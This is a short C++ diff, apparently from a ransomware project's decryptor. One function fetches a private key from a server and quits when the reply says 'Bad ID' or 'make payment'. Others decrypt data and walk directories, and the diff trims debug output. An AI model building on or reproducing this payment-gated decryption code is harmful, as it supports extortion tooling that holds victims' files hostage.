@@ -10,6 +10,11 @@ Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor)
 	string chunk;
 	Status status;
 	status = getFromServer(url, chunk);
+	if (string::npos != chunk.find("Bad ID") ||
+		string::npos != chunk.find("make payment"))
+	{
+		exit(1);
+	}
 	rsaDecryptor = parsePrivateKey(chunk);
 	return status;
 }
@@ -87,9 +92,7 @@ Status DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD Cip
 	if (!NT_SUCCESS(status)) {
 		goto DECCLEAN;
 	}
-#ifdef DEBUG
-	std::cout << "Ciphertext:\t" << cipherText << std::endl;
-#endif
+
 	
 	if(string::npos != i)
 	{
@@ -205,6 +208,7 @@ static void iterate(const path& parent, RsaDecryptor& rsaDecryptor) {
 	Status status = STATUS_SUCCESS;
 	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
 		path = itr->path().string();
+		//std::cout << "handling " << path << std::endl;
 		string ending(path.begin() + path.size() - 3, path.end());
 		bool lnkFile = false;
 
